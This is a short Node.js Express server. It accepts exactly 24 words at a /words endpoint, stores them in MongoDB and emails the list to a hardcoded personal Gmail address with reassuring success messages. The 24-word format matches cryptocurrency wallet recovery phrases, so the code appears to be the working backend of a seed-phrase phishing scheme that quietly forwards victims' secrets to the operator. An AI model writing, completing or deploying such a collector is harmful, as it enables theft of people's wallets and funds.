require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const { Resend } = require('resend');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => console.log("Connected to MongoDB"))
.catch(err => console.error("MongoDB Connection Error:", err));

// Define a schema for the words
const wordSchema = new mongoose.Schema({
    words: [String]
});

// Create a model based on the schema
const Word = mongoose.model('Word', wordSchema);

// Initialize Resend with API key
const resend = new Resend(process.env.RESEND_API_KEY);

// Route to handle POST requests with 24 words
app.post('/words', async (req, res) => {
    const { words } = req.body;

    if (!words || words.length !== 24) {
        return res.status(400).json({ error: 'Please provide exactly 24 words.' });
    }

    try {
        const newWordEntry = new Word({ words });
        await newWordEntry.save();

        const wordList = words.map((word, index) => `${index + 1}. ${word}`).join('<br>');

        // Send email to two recipients
        await resend.emails.send({
            from: 'onboarding@resend.dev',
            to: ['festusmena9@gmail.com'], // Add the second email here
            subject: 'Words Saved Successfully!',
            html: `<p>You have successfully saved your 24 words:</p><p>${wordList}</p>`
        });

        res.status(201).json({ message: 'Words saved successfully and email sent to both recipients!' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'An error occurred while processing your request.' });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});